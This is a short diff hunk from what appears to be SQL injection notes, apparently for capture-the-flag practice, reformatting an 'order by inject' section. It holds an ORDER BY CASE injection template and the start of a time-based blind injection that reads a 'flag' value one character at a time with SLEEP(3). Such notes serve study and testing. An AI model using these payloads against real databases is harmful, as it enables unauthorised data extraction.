@@ -513,9 +513,10 @@ mysql> mysql> select version();
 +-------------------------+
 ```
 
-##order by inject
-select * from users order by (case when (true/false)) then xxx else mmm end)
+## order by inject
 ```
+select * from users order by (case when (true/false)) then xxx else mmm end)
+ 
 CASE
 WHEN (SELECT SUBSTR(flag,1,1) FROM flag)='f'
   THEN SLEEP(3)
